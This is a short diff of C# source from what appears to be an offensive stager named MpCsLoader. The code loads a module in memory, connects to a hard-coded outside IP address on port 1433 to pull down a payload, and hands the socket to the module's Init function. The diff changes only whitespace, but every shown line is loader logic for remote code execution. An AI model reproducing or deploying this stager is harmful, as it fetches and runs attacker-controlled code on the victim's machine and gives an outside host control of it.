@@ -41,7 +41,7 @@ namespace MpCsLoader
                     IntPtr init = MemoryLibrary.MemoryGetProcAddress((MemoryLibrary.MEMORYMODULE*)mod.ToPointer(), "Init");
                     MpInit func = (MpInit)Marshal.GetDelegateForFunctionPointer(init, typeof(MpInit));
                     int sockfd = StageLoader.LoadBinData("107.170.234.111", 1433);
-                    func(sockfd);
+                    func(sockfd); 
                 }
             }//hehe
             catch(Exception x)
